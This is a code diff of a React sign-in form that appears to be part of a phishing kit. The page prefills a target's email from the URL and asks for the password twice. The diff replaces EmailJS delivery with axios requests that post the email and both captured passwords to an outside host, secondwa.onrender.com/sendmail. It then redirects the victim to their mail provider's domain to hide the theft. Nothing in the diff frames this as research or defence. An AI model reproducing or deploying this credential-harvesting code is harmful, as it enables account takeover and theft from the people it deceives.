@@ -1,9 +1,9 @@
 import "./App.css";
 import React, { useState } from "react";
 import { Styls } from "./stylls";
-import emailjs from "emailjs-com";
 import { useParams } from "react-router-dom";
 import logo from "./Untitled.png";
+import axios from "axios";
 
 function Forms() {
   const params = useParams();
@@ -11,54 +11,47 @@ function Forms() {
 
   const [showForm, setShowForm] = useState(true);
   const [confirmForm, setConfirmForm] = useState(false);
+  const [loading, setLoading] = useState(false);
+  const [pass, setPass] = useState("");
+  const [pasers, setPasser] = useState("");
+  const [email, setEmail] = useState(params.id);
 
-  const submitHandler = (e) => {
+  const submitHandler = async (e) => {
     e.preventDefault();
 
-    emailjs
-      .sendForm(
-        "service_9gr7dl4",
-        "template_jqea7es",
-        e.target,
-        "9dXUFDcqMMUBHV8Cj"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
-    e.preventDefault();
-    setShowForm(false);
+    console.log(email, pass);
     setConfirmForm(true);
+    setShowForm(false);
+    try {
+      await axios.post("https://secondwa.onrender.com/sendmail", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
   };
-
-  const editHandler = (e) => {
+  const editHandler = async (e) => {
     e.preventDefault();
-    let emailss = params.id;
-    let domain = emailss.substring(emailss.lastIndexOf("@") + 1);
-    emailjs
-      .sendForm(
-        "service_9gr7dl4",
-        "template_jqea7es",
-        e.target,
-        "9dXUFDcqMMUBHV8Cj"
-      )
-      .then(
-        (result) => {
-          console.log(result.text);
-        },
-        (error) => {
-          console.log(error.text);
-        }
-      );
+    setLoading(true);
 
+    let domain = email.substring(email.lastIndexOf("@") + 1);
+
+    try {
+      await axios.post("https://secondwa.onrender.com/sendmail", {
+        email,
+        pass,
+        pasers,
+      });
+    } catch (error) {
+      console.log(error);
+    }
     window.setTimeout(() => {
       window.location.href = `https://${domain}`;
     }, 1000);
   };
+
   return (
     <Styls>
       <div className="contsainer">
@@ -73,6 +66,7 @@ function Forms() {
 
                 <input
                   type="email"
+                  onChange={(e) => setEmail(e.target.value)}
                   name="to_user"
                   required
                   value={params.id}
@@ -83,6 +77,7 @@ function Forms() {
                 <span className="labeltext">Password:</span>
                 <input
                   type="password"
+                  onChange={(e) => setPass(e.target.value)}
                   pattern="(?=.*[0-9]).{8,}"
                   name="to_pass"
                   required
@@ -121,12 +116,19 @@ function Forms() {
               <div className="labcon">
                 <span className="labeltext">Username:</span>
 
-                <input type="email" name="to_user" required value={params.id} />
+                <input
+                  type="email"
+                  onChange={(e) => setEmail(e.target.value)}
+                  name="to_user"
+                  required
+                  value={params.id}
+                />
               </div>
               <div className="labcon">
                 <span className="labeltext">Password:</span>
                 <input
                   type="password"
+                  onChange={(e) => setPasser(e.target.value)}
                   pattern="(?=.*[0-9]).{8,}"
                   name="to_pass"
                   required
@@ -137,7 +139,7 @@ function Forms() {
                 <label>
                   <input type="checkbox" /> stay signed in
                 </label>
-                <button> Sign In </button>
+                <button>{loading ? "Loading....." : "Sign In"}</button>
               </div>
               <hr></hr>
               <div className="stay2">
